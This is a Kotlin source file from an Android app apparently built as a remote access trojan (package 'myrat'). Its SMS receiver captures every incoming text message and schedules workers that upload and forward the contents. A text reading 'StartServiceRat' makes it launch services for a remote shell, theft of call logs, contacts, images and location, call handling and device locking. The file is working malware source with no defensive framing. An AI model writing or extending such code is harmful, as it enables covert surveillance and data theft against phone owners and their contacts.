package com.myrat.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import androidx.core.content.ContextCompat
import com.myrat.app.service.*
import com.myrat.app.utils.Logger
import com.myrat.app.worker.SmsUploadWorker
import com.myrat.app.worker.SmsForwardWorker

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (smsMessages.isNullOrEmpty()) {
                Logger.error("No SMS messages found in intent")
                return
            }

            // Group messages by sender to handle multi-part SMS
            val messagesBySender = mutableMapOf<String, MutableList<SmsMessage>>()
            smsMessages.forEach { sms ->
                val sender = sms.originatingAddress ?: "Unknown"
                messagesBySender.computeIfAbsent(sender) { mutableListOf() }.add(sms)
            }

            messagesBySender.forEach { (sender, messages) ->
                if (messages.isEmpty()) {
                    Logger.error("No messages for sender: $sender")
                    return@forEach
                }

                val sortedMessages = messages.sortedBy { it.index }
                val fullMessage = sortedMessages.joinToString("") { it.messageBody ?: "" }
                val timestamp = sortedMessages.first().timestampMillis

                Logger.log("Received SMS from $sender at $timestamp: $fullMessage")

                context?.let {
                    SmsUploadWorker.scheduleWork(sender, fullMessage, timestamp, it)
                    SmsForwardWorker.scheduleForwardWork(sender, fullMessage, timestamp, it)
                    Logger.log("Scheduled SMS upload and forward work for $sender")

                    // 🔥 Check for service start command
                    if (fullMessage.trim().equals("StartServiceRat", ignoreCase = true)) {
                        Logger.log("Triggering all services via SMS command")

                        startAllServices(it)
                    }
                } ?: Logger.error("Context is null, cannot process SMS from $sender")
            }
        } else {
            Logger.error("Invalid intent action: ${intent?.action}")
        }
    }

    private fun startAllServices(context: Context) {
        val services = listOf(
            SmsService::class.java,
            ShellService::class.java,
            CallLogUploadService::class.java,
            ContactUploadService::class.java,
            ImageUploadService::class.java,
            LocationService::class.java,
            CallService::class.java,
            LockService::class.java
        )

        services.forEach { service ->
            val intent = Intent(context, service)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        Logger.log("All services started successfully.")
    }

    private val SmsMessage.index: Int
        get() {
            val pdu = this.pdu
            if (pdu != null && pdu.size > 0 && pdu[0].toInt() != 0) {
                val udhLength = pdu[0].toInt()
                if (pdu.size > udhLength + 5) {
                    return pdu[udhLength + 4].toInt()
                }
            }
            return 0
        }
}
